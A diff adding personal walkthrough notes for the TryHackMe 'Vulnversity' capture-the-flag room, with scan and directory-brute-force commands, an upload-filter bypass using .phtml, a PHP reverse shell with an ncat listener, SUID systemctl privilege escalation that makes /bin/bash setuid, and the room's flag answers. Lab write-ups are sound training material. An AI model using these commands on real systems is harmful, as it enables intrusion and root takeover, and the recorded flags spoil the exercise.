@@ -1,3 +1,5 @@
+https://tryhackme.com/room/vulnversity
+
 #Task 2 - Reconnaissance 
 - Scan the box, how many ports are open?
 hint:nmap -sV -sC $IP
@@ -13,7 +15,90 @@ hint:nmap -sV -sC $IP
 DNS
 
 - What is the most likely operating system this machine is running?
+ubuntu
 
+- What port is the web server running on?
+3333
+
+#Task 3 -  Locating directories using GoBuster
+
+gobuster dir -u http://<ip>:3333 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+or dir http://<ip?:3333
+
+- What is the directory that has an upload form page?
+/internal/
+
+#Task 4  Compromise the webserver
+- Try upload a few file types to the server, what common extension seems to be blocked?
+.php
+
+- Run this attack, what extension is allowed?
+.phtml
+
+
+#Download shell
+https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php
+Edit file php-reverse-shell.php
+$ip='<ip>'
+
+Windows: use ncat
+ncat -lvpn 1234
+
+- What is the name of the user who manages the webserver?
+bill
+
+- What is the user flag?
+cat /home/bill/user.txt
+8bd7992fbe8a6ad22a63361004cfcedb
+
+#Task 5  Privilege Escalation
+
+find / -perm -u=s -type f 2>/dev/null
+find / -type f -user root -perm -4000 -exec ls -l {} + 2> /dev/null
+Command Options
+-type f : Look only for files
+-user root : The owner of the file should be root
+-perm 4000 : The file should have at minimum the SUID bit set
+-exec : Execute another command on output of find
+ls -l {} + : List all the files found by find in long format ({} is placeholder for the location where the find command results will be substituted. The + at the end is used to terminate the command)
+Looking at the output we see the systemctl command that is used to run various services on the system. Since this executable has the SUID bit set if we execute an command using systemctl we should get root privileges for that command.
+
+- On the system, search for all SUID files. What file stands out?
+/bin/systemctl
+
+First lets find out the directories on the system where we have permission to create files.
+find / -type d -writeable -maxdepth 2 2> /dev/null
+
+https://gtfobins.github.io/gtfobins/systemctl/#suid
+
+- Its challenge time! We have guided you through this far, are you able to exploit this system further to escalate your privileges and get the final answer?
+Become root and get the last flag (/root/root.txt)
+
+TF2=$(mktemp).service
+echo '[Service]
+Type=oneshot
+ExecStart=/bin/sh -c "cat /root/root.txt > /tmp/root.txt"
+[Install]
+WantedBy=multi-user.target' > $TF2
+/bin/systemctl link $TF2
+/bin/systemctl enable --now $TF2
+
+Now cat root.txt
+a58ff8579f0a9270368d33a9966c7fd5
+
+Now how do we become root.
+Why not start a shell as root Within this shell
+ExecStart=/bin/sh -c "chmod +s /bin/bash"
+
+TF2=$(mktemp).service
+echo '[Service]
+Type=oneshot
+ExecStart=/bin/sh -c "chmod +s /bin/bash"
+[Install]
+WantedBy=multi-user.target' > $TF2
+/bin/systemctl link $TF2
+/bin/systemctl enable --now $TF2
+/bin/bash -p
 
 
 
@@ -38,3 +123,5 @@ apt search man | grep -i db
 apt-cache search manpages | egrep 'manpages-(dev|posix)'
 apt install manpages
 sudo apt install man-db manpages-posix
+
+
